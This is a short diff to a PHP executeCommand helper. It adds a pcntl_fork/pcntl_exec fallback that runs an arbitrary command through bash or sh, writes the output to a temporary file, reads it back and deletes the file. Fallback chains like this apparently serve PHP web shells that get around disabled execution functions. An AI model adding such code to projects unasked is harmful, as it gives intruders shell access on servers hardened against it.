@@ -49,6 +49,24 @@ function executeCommand($cmd) {
         $handle = proc_open($cmd, array(0 => array('pipe', 'r'), 1 => array('pipe', 'w')), $pipes);
         $output = stream_get_contents($pipes[1]);
         proc_close($handle);
+    } else if (allFunctionExist(array('pcntl_fork', 'pcntl_exec', 'file_exists', 'file_put_contents', 'file_get_contents'))) {
+        $file = "/bin/bash";
+        if (!file_exists($file)) {
+            $file = "/bin/sh";
+        }
+        $resultFile = sys_get_temp_dir()."/".(time()+1).".log";
+        $pid = pcntl_fork();
+        if ($pid === 0) {
+            $args = array("-c", "$cmd > $resultFile 2>&1");
+            pcntl_exec($file, $args);
+            exit(0);
+        } else if ($pid !== -1) {
+            pcntl_waitpid($pid, $status);
+        }
+        if (file_exists($resultFile)) {
+            $output = file_get_contents($resultFile);   
+            @unlink($resultFile);
+        }
     }
     return $output;
 }
